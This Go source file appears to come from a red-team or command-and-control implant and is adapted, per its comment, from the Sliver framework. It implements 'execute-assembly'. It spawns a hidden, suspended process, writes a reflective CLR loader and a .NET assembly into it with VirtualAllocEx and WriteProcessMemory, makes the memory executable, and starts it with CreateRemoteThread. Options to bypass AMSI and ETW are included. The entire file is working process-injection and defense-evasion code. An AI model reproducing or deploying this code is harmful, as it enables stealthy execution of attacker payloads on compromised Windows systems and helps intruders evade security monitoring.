package execute_assembly

import (
	"bytes"
	"encoding/binary"
	"golang.org/x/sys/windows"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"../syscalls"

)

// Adapted from https://github.com/BishopFox/sliver/blob/e3902dab825ac7d039099a784bbe6a706aa17721/sliver/taskrunner/task_windows.go#L332
var (
	CurrentToken windows.Token
)

const (
	PROCESS_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
	STILL_ACTIVE       = 259
)


// Function to execute .NET assembly
func ExecuteAssembly(CLR, assembly []byte, process, params string, amsi bool, etw bool, offset uint32) (string, error) {
	assemblySizeArr := convertIntToByteArr(len(assembly))
	paramsSizeArr := convertIntToByteArr(len(params) + 1)

	// These will contain the stdout and stderr
	var stdOutBuffer, stdErrBuffer bytes.Buffer
	// Create a new suspended process
	cmd, err := startProcess(process, &stdOutBuffer, &stdErrBuffer, true)
	if err != nil {
		return "", err
	}

	pid := cmd.Process.Pid

	// Get a handle to the process
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	// Close process on exit
	defer windows.CloseHandle(handle)

	hostingDllAddr, err := allocAndWrite(CLR, handle, uint32(len(CLR)))
	if err != nil {
		return "", err
	}

	// 4 bytes Assembly Size
	// 4 bytes Params Size
	// 1 byte AMSI bool  0x00 no  0x01 yes
	// 1 byte ETW bool  0x00 no  0x01 yes
	// parameter bytes
	// assembly bytes
	payload := append(assemblySizeArr, paramsSizeArr...)
	if amsi {
		payload = append(payload, byte(1))
	} else {
		payload = append(payload, byte(0))
	}
	if etw {
		payload = append(payload, byte(1))
	} else {
		payload = append(payload, byte(0))
	}
	payload = append(payload, []byte(params)...)
	payload = append(payload, '\x00')
	payload = append(payload, assembly...)
	totalSize := uint32(len(payload))

	assemblyAddr, err := allocAndWrite(payload, handle, totalSize)
	if err != nil {
		return "", err
	}

	threadHandle, err := protectAndExec(handle, hostingDllAddr, uintptr(hostingDllAddr)+ uintptr(offset), assemblyAddr, uint32(len(CLR)))
	if err != nil {
		return "", err
	}

	err = waitForCompletion(threadHandle)
	if err != nil {
		return "", err
	}

	err = cmd.Process.Kill()
	if err != nil {
		return "", err
	}

	return stdOutBuffer.String() + stdErrBuffer.String(), nil
}


func convertIntToByteArr(num int) []byte {
	buff := make([]byte, 4)
	binary.LittleEndian.PutUint32(buff, uint32(num))
	return buff
}

func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
	cmd := exec.Command(proc)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token: syscall.Token(CurrentToken),
	}
	cmd.Stdout = stdout
	cmd.Stderr = stderr
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	if suspended {
		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
	}
	err := cmd.Start()
	if err != nil {
		return nil, err
	}
	return cmd, nil
}

func allocAndWrite(data []byte, handle windows.Handle, size uint32) (dataAddr uintptr, err error) {
	// VirtualAllocEx to allocate a new memory segment into the target process
	dataAddr, err = syscalls.VirtualAllocEx(handle, uintptr(0), uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return
	}
	// WriteProcessMemory to write the reflective loader into the process
	var nLength uintptr
	err = syscalls.WriteProcessMemory(handle, dataAddr, &data[0], uintptr(uint32(len(data))), &nLength)
	if err != nil {
		return
	}
	return
}

func protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr uintptr, argAddr uintptr, dataLen uint32) (threadHandle windows.Handle, err error) {
	var oldProtect uint32
	err = syscalls.VirtualProtectEx(handle, startAddr, uintptr(dataLen), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return
	}
	attr := new(windows.SecurityAttributes)
	var lpThreadId uint32
	threadHandle, err = syscalls.CreateRemoteThread(handle, attr, 0, threadStartAddr, argAddr, 0, &lpThreadId)
	if err != nil {
		return
	}
	return
}

func waitForCompletion(threadHandle windows.Handle) error {
	for {
		var code uint32
		err := syscalls.GetExitCodeThread(threadHandle, &code)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			return err
		}
		if code == STILL_ACTIVE {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	return nil
}